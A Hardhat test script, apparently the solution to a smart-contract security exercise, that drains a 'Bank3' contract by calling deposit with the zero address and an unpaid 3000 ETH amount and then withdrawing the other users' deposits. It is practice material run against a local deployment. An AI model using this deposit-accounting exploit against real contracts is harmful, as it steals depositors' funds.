import { ethers } from "hardhat";
import utils from '../utils'
import {Contract} from 'ethers'
import {SignerWithAddress} from "@nomiclabs/hardhat-ethers/dist/src/signer-with-address";

const fromEther = utils.fromEther
const toEther = utils.toEther

describe('Bank3', function () {
    let bank: Contract
    let attacker: SignerWithAddress, user1: SignerWithAddress, user2: SignerWithAddress, user3: SignerWithAddress

    before(async () => {
        [attacker, user1, user2, user3] = await ethers.getSigners()
        
        // attacker has about 1 ETH
        await attacker.sendTransaction({to: utils.DeadAddress, value: (await ethers.provider.getBalance(attacker.address)).sub(toEther(1))})
        console.log("balanceOf attacker at the beginning: ", fromEther(await ethers.provider.getBalance(attacker.address)))

        const Bank = await ethers.getContractFactory("Bank3")
        bank = await Bank.deploy()
    })

    it('deposit', async () => {
        // Deposit 3 users
        await bank.connect(user1).depositETH({value: toEther(1000)})
        await bank.connect(user2).depositETH({value: toEther(1000)})
        await bank.connect(user3).depositETH({value: toEther(1000)})
        console.log(`total vault locked ETH: ${fromEther(await ethers.provider.getBalance(bank.address))}`)

        //////////////////////////////////////////////////////////////////////////////////////
        // TODO: Withdraw all of depoist
        await bank.connect(attacker).deposit(utils.ZeroAddress, toEther(3000))
        await bank.connect(attacker).withdraw(utils.ZeroAddress, toEther(3000))
        //////////////////////////////////////////////////////////////////////////////////////
        
        console.log(`total vault locked ETH: ${fromEther(await ethers.provider.getBalance(bank.address))}`)
        utils.assertEqual(await ethers.provider.getBalance(bank.address), toEther(0))
        console.log("[Exploit Bank3] success")
    })

});
